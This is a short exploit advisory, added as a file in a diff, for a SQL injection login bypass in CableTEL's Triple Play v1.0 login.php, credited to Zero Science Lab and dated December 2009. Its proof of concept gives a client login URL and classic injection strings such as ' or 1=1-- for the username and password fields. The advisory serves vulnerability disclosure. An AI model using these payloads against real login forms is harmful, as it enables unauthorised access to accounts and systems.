@@ -1,0 +1,28 @@
+
+##############################################################################
+
+  CableTEL's Triple Play v1.0 (login.php) Remote Login Bypass SQL Injection Exploit
+
+  21.12.2009
+
+  by Gjoko 'LiquidWorm' Krstic
+
+  Zero Science Lab
+
+  http://www.zeroscience.mk
+
+  Advisory: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4925.php
+
+##############################################################################
+
+PoC:
+
+https://clients.[site]/clients/index.php
+
+user and pass:
+
+'+           '+
+
+[space]      [space]
+
+' or 1=1--   ' or 1=1--
